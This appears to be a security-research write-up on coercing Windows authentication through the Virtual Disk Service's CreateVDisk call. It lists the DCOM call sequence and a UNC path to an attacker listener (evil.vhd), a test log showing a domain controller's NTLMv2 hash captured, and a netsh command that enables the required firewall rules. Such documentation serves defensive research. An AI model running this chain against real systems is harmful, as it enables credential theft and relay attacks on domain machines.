# MS-VDS - Remote call to IVdsVdProvider::CreateVDisk (opnum 4)

## Summary

+ **Protocol**: [[MS-VDS]: Virtual Disk Service (VDS) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/90977af2-515e-4fbd-809c-fdb280ab48db)

+ **Interface**: `IVdsVdProvider` (IID `B481498C-8354-45F9-84A0-0BDD2832A91F`), reached by **DCOM activation** of the Virtual Disk Service — there is no named pipe; the object is activated via DCOM and reached on its dynamic `ncacn_ip_tcp` endpoint.

+ **Function name**: [`IVdsVdProvider::CreateVDisk`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/f4902b82-754f-4d5c-9c02-9bd91e149200)

+ **Function operation number**: `4`

+ **Authenticated**: Yes (local administrator on the target)

## Description

`CreateVDisk` creates a virtual-disk (VHD) backing file. Its `pPath` parameter is, per
[MS-VDS] 3.4.5.2.15.2, "the name and directory path for the backing file" of the virtual disk;
the Virtual Disk Service creates/opens that file to build the VHD. Pointing `pPath` at a UNC path
makes the service (running as the machine account) authenticate outbound to the listener while
creating the file — an authentication coercion.

### Conditions — a DCOM chain is required (not a single call)

`CreateVDisk` is **not** reachable as a bare RPC call. `IVdsVdProvider` is obtained by activating
the Virtual Disk Service and walking its object model to a virtual-disk provider:

1. **DCOM activation** of `CLSID_VirtualDiskService` (`7D1933CB-86F6-4A98-8628-01BE94C9A575`),
   requesting `IID_IVdsServiceInitialization`.
2. `IVdsServiceInitialization::Initialize(NULL)` (opnum 3), then `QueryInterface` for
   `IID_IVdsService` (`0818A8EF-9BA9-40D8-A6F9-E22833CC771E`).
3. `IVdsService::WaitForServiceReady` (opnum 4), then
   `IVdsService::QueryProviders(VDS_QUERY_VIRTUALDISK_PROVIDERS = 0x4)` (opnum 6), which returns an
   `IEnumVdsObject`.
4. `IEnumVdsObject::Next` (opnum 3) to enumerate the provider objects, then `QueryInterface` each
   for `IID_IVdsVdProvider`.
5. `IVdsVdProvider::CreateVDisk(pPath = \\<listener>\share\evil.vhd, ...)` (opnum 4).

+ **Privilege**: local administrator on the target (the VDS interfaces enforce it).
+ **Coerced parameter**: `pPath` (UNC path to the VHD backing file).

## Function technical detail

```cpp
HRESULT CreateVDisk(
   [in] PVIRTUAL_STORAGE_TYPE VirtualDeviceType,
   [in, string] LPWSTR pPath,
   [in, string, unique] LPWSTR pStringSecurityDescriptor,
   [in] CREATE_VIRTUAL_DISK_FLAG Flags,
   [in] ULONG ProviderSpecificFlags,
   [in] ULONG Reserved,
   [in] PVDS_CREATE_VDISK_PARAMETERS pCreateDiskParameters,
   [in, out, unique] IVdsAsync** ppAsync
 );
```

+ **VirtualDeviceType**: `VIRTUAL_STORAGE_TYPE { ULONG DeviceId; GUID VendorId; }` — `DeviceId = 2`
  (VHD), `VendorId = EC984AEC-A0F9-47E9-901F-71415A66345B` (Microsoft).
+ **pPath**: the coerced UNC path to the backing file.
+ **pCreateDiskParameters**: `VDS_CREATE_VDISK_PARAMETERS { GUID UniqueId; ULONGLONG MaximumSize;
  ULONG BlockSizeInBytes; ULONG SectorSizeInBytes; LPWSTR pParentPath; LPWSTR pSourcePath; }`.
+ **ppAsync**: `[in,out,unique]` — pass `&pAsync` with `pAsync = NULL` (a NULL *outer* pointer makes
  the service reset the connection).

## Testing status — CONFIRMED (with required target-side prerequisites)

**Confirmed coercion on Windows Server 2025** (domain controller), 2026-09-13, once the
prerequisites below were met. Full DCOM chain via
[`poc/python/coerce_poc.py`](./poc/python/coerce_poc.py) (impacket `DCOMConnection`):

```
CoCreateInstanceEx(CLSID_VirtualDiskService, IID_IVdsServiceInitialization)
IVdsServiceInitialization::Initialize(NULL)                       [opnum 3]
QueryInterface -> IVdsService
IVdsService::WaitForServiceReady                                  [opnum 4]
IVdsService::QueryProviders(VDS_QUERY_VIRTUALDISK_PROVIDERS=0x4)  [opnum 6] -> IEnumVdsObject
IEnumVdsObject::Next                                              [opnum 3] -> 1 provider
QueryInterface -> IVdsVdProvider
IVdsVdProvider::CreateVDisk(pPath="\\<listener>\share\evil.vhd")  [opnum 4] -> S_OK
  -> listener: TMP-W-2025-DC1$ authenticated (NTLMv2 captured)
```

The service connected to the listener and created/opened `evil.vhd` (`smb2Create evil.vhd`)
authenticating as the DC machine account. The first call returns `S_OK`; repeated calls against a
listener that already reports the file return `0x80070050` (ERROR_FILE_EXISTS) — a benign post-auth
status, the coercion has already occurred (only the captured hash on the listener is evidence, not
the return code).

### PREREQUISITES (the key findings)

1. **Local administrator on the target.** The VDS interfaces enforce it; a non-admin cannot walk the
   provider object model.

2. **The "Remote Volume Management" firewall rule group must be ENABLED** — it is **disabled by
   default**. VDS is DCOM-only and its interface calls run on the RPC dynamic port range
   (49152-65535). With the group disabled, the DCOM **activation** on TCP/135 succeeds
   (`CoCreateInstanceEx` returns the object) but the first **interface** call is silently dropped by
   the host firewall (the connection to the dynamic port times out). Enable it on the target with:

   ```
   netsh advfirewall firewall set rule group="Remote Volume Management" new enable=yes
   ```

   This group covers both the Virtual Disk Service and the Virtual Disk Service Loader. It is the VDS
   analogue of the COMA `RemoteAccessEnabled=1` gate. Because both prerequisites are administrative
   and off by default, this is a by-design, admin-gated primitive rather than a low-privilege one.

### Client marshalling notes

- The `impacket.dcerpc.v5.dcom.vds` helper methods call `request()` **without an `iid`**
  (`connect(None)` -> "IID is None"); drive every call directly as
  `interface.request(req, IID, interface.get_iPid())`.
- `VirtualDeviceType`, `pPath` and `pCreateDiskParameters` are top-level `[ref]` pointers: in NDR
  they marshal **inline with no referent id**, so they are modelled as the value type directly
  (`NDRSTRUCT` / `WSTR`), not wrapped in a pointer. Modelling them as pointers adds a spurious
  referent id and the server faults with `rpc_x_bad_stub_data`.
- `ppAsync` must be `&pAsync` with `pAsync = NULL`; a NULL *outer* pointer makes the service reset
  the connection.

## References

+ Documentation of protocol [MS-VDS]: Virtual Disk Service (VDS) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/90977af2-515e-4fbd-809c-fdb280ab48db

+ Documentation of function `IVdsVdProvider::CreateVDisk` (opnum 4): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/f4902b82-754f-4d5c-9c02-9bd91e149200

+ `VDS_CREATE_VDISK_PARAMETERS`: https://learn.microsoft.com/en-us/windows/win32/api/vds/ns-vds-vds_create_vdisk_parameters
